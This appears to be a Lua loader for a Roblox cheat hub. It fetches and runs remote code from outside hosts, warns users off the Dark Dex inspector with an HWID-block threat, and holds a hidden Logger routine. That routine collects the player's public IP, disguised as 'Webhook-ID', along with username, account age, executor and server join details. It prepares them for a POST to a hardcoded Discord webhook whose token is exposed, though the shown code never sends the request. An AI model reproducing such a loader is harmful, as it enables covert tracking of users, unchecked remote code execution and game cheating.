--//
--// Loader Script Made By xS_Killus
--//

--//
--// Game Loading...
--//

repeat
    task.wait()
until game.GameId ~= 0 and game:IsLoaded()

--//
--// UI Library
--//

local library = loadstring(game:HttpGet("https://raw.nebulasoftworks.xyz/starlight"))()
local NebulaIcons = loadstring(game:HttpGet("https://raw.nebulasoftworks.xyz/nebula-icon-library-loader"))()

getgenv()["library"] = library
getgenv()["NebulaIcons"] = NebulaIcons

getgenv()["library"].WindowKeybind = "X"

--//
--// Script Already Loaded...
--//

if getgenv()["B-S-Hub_Loaded"] then
    library:Notification({
        Title = "Break-Skill Hub | V1 | Error",
        Content = "Script is already loaded.",
        Icon = NebulaIcons:GetIcon("warning_error", "Fluency"),
        Duration = 30
    }, "ERROR_Loaded")

    return
end

--//
--// Instances And Funtions...
--//

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local Client = Players.LocalPlayer

RunService.RenderStepped:Connect(function()
    for i, v in pairs(CoreGui:GetChildren()) do
        if v:FindFirstChild("PropertiesFrame") then
            if v:FindFirstChild("ExplorerPanel") then
                if v:FindFirstChild("SideMenu") then
                    library:Notification({
                        Title = "Break-Skill Hub | V1 | Error",
                        Content = "Dark Dex Detected!\nIf you keep trying to use Dark Dex while Break-Skill Hub is loaded your HWID may be blocked!\ndiscord.gg/ev8bxrAa9p",
                        Icon = NebulaIcons:GetIcon("warning_error", "Fluency"),
                        Duration = 60
                    }, "ERROR_DarkDex")

                    return
                end
            end
        end
    end
end)

local function Logger()
    local ExecutorUsing = identifyexecutor()

    local Laos = game:HttpGet("https://api6.ipify.org/?format=plain")

    local Data = {
        ["embeds"] = {
            {
                ["title"] = "Experience",
                ["url"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", " .. game.JobId .. ", game:GetService('Players').LocalPlayer",
                ["description"] = Client.Name .. ": https://www.roblox.com/users/" .. Client.UserId,
                ["color"] = 16731726,
                ["fields"] = {
                    {
                        ["name"] = "Executor",
                        ["value"] = ExecutorUsing,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Age",
                        ["value"] = Client.AccountAge,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Webhook-ID",
                        ["value"] = Laos,
                        ["inline"] = true
                    }
                }
            }
        }
    }

    local Headers = {
        ["Content-Type"] = "application/json"
    }

    local Encoded = HttpService:JSONEncode(Data)

    local Request = http_request or request or HttpPost or syn.request

    local Final = {
        Url = "https://discordapp.com/api/webhooks/1082708519075184640/0T7HzRE33fG23btZCJXPj9osWF9QnOScXQF2co-dubgD0XVGTRbqXM1Y-FwYQOyYds9q",
        Body = Encoded,
        Method = "POST",
        Headers = Headers
    }
end

--//
--// Script Loading...
--//

if game.PlaceId == 155615604 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sklllus/B-S-Hub-V1/refs/heads/main/Games/155615604.lua"))()
else
    library:Notification({
        Title = "Break-Skill Hub | V1 |  Error",
        Content = MarketplaceService:GetProductInfo(game.PlaceId).Name .. " is not supported game!",
        Icon = NebulaIcons:GetIcon("warning_error", "Fluency"),
        Duration = 30
    }, "ERROR_UnSupportedGame")

    Logger()

    return
end
